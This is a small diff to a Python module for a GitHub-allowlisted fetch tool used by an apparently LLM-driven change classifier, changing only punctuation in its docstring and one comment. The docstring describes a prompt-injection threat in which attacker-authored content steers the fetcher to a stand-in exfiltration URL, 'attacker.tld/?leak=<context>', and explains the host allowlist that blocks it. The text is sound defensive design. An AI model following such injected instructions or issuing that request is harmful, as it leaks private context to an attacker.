@@ -1,12 +1,12 @@
-"""GitHub-allowlisted enrichment fetch (MF2) — pull ADDITIONAL context for a change from GitHub only.
+"""GitHub-allowlisted enrichment fetch (MF2): pull ADDITIONAL context for a change from GitHub only.
 
 The threat model here is sharper than a normal fetch tool's: the change under classification is
 ATTACKER-AUTHORED, so an injected instruction could try to steer a fetcher into
-`GET https://attacker.tld/?leak=<context>` — a data-exfiltration channel. rlm-harness's SSRF guard blocks
+`GET https://attacker.tld/?leak=<context>`, a data-exfiltration channel. rlm-harness's SSRF guard blocks
 INTERNAL/metadata targets, but an attacker-EXTERNAL URL is its allowed case. So this wrapper adds a HOST
 ALLOWLIST on top: only GitHub API/content hosts are reachable, and there is no way to fetch a
 "referenced URL" the change names. Enrichment is OFF by default (`enable_fetch=False`) for the same
-reason — turn it on only when you need to pull the full file/commit context and trust the GitHub hosts.
+reason: turn it on only when you need to pull the full file/commit context and trust the GitHub hosts.
 
 Base/wrap split: the SSRF primitives (`is_safe_url`, `resolved_host_is_safe`, `parse_cidrs`) are the kit's;
 this module owns the allowlist + the httpx provider + tracing. Sync (dspy invokes tools synchronously).
@@ -87,7 +87,7 @@ def make_github_fetch_tool(config: DetectConfig) -> Callable[[str], str]:
                         return body
                 record_tool_call("fetch_url", args={"url": url}, ok=False, note="too many redirects")
                 return f"Refused: too many redirects starting from {u!r}."
-        except Exception as exc:  # noqa: BLE001 — surface as text so the RLM can react
+        except Exception as exc:  # noqa: BLE001 (surface as text so the RLM can react)
             record_tool_call("fetch_url", args={"url": url}, ok=False, note=f"error: {type(exc).__name__}")
             return f"Fetch error for {u!r}: {type(exc).__name__}: {str(exc)[:160]}"
 
